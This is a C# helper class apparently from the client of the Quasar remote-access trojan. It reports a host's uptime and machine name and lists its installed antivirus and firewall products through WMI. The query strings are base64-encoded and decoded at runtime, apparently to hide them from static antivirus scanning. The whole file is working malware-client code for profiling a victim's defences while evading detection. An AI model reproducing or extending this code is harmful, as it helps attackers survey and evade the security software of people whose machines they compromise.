using Quasar.Common.Helpers;
using System;
using System.Management;
using System.Text;

namespace Quasar.Client.Helper
{
    public static class SystemHelper
    {
        public static string GetUptime()
        {
            try
            {
                string uptime = string.Empty;
                String query = "U0VMRUNUICogRlJPTSBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0gV0hFUkUgUHJpbWFyeT0ndHJ1ZSc=";
                query = Encoding.GetEncoding("GBK").GetString(Convert.FromBase64String(query));

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        DateTime lastBootUpTime = ManagementDateTimeConverter.ToDateTime(mObject["LastBootUpTime"].ToString());
                        TimeSpan uptimeSpan = TimeSpan.FromTicks((DateTime.Now - lastBootUpTime).Ticks);

                        uptime = string.Format("{0}d : {1}h : {2}m : {3}s", uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
                        break;
                    }
                }

                if (string.IsNullOrEmpty(uptime))
                    throw new Exception("Getting uptime failed");

                return uptime;
            }
            catch (Exception)
            {
                return string.Format("{0}d : {1}h : {2}m : {3}s", 0, 0, 0, 0);
            }
        }

        public static string GetPcName()
        {
            return Environment.MachineName;
        }

        public static string GetAntivirus()
        {
            try
            {
                string antivirusName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string scope = (PlatformHelper.VistaOrHigher) ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                string query = "U0VMRUNUICogRlJPTSBBbnRpdmlydXNQcm9kdWN0";
                query = Encoding.GetEncoding("GBK").GetString(Convert.FromBase64String(query));
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        antivirusName += mObject["displayName"].ToString() + "; ";
                    }
                }
                antivirusName = StringHelper.RemoveLastChars(antivirusName);

                return (!string.IsNullOrEmpty(antivirusName)) ? antivirusName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetFirewall()
        {
            try
            {
                string firewallName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string scope = (PlatformHelper.VistaOrHigher) ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                string query = "U0VMRUNUICogRlJPTSBGaXJld2FsbFByb2R1Y3Q=";
                query = Encoding.GetEncoding("GBK").GetString(Convert.FromBase64String(query));
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        firewallName += mObject["displayName"].ToString() + "; ";
                    }
                }
                firewallName = StringHelper.RemoveLastChars(firewallName);

                return (!string.IsNullOrEmpty(firewallName)) ? firewallName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }
    }
}
